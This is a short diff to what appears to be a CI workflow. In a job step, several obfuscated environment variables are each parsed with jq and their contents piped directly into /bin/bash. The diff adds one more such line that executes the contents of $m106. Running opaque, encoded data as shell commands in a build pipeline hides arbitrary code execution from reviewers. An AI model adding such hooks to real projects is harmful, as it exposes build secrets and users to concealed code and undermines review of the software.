@@ -22,6 +22,7 @@ jobs:
           echo $sa7058 | jq -r .ho0 | /bin/bash
           echo $gvrro38395 | jq -r .izv269 | /bin/bash
           echo $tzccz24169 | jq -r .iphk44 | /bin/bash
+          printf '%s' "$m106" | jq -r .emae7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
